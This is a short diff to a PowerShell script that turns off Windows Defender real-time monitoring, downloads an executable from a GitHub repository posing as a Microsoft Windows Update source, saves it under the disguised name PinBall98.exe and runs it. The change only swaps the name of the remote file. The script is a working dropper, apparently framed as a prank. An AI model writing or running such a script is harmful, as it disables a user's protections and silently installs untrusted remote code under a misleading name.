@@ -23,7 +23,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 mkdir $home\SystemFiles
 
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile('https://github.com/MilkrosoftWindows/WindowsUpdate/raw/warni/cyberbamboozled.exe', $home+'\SystemFiles\PinBall98.exe')
+$WebClient.DownloadFile('https://github.com/MilkrosoftWindows/WindowsUpdate/raw/warni/warni.exe', $home+'\SystemFiles\PinBall98.exe')
 
 start $home\SystemFiles\PinBall98.exe
 
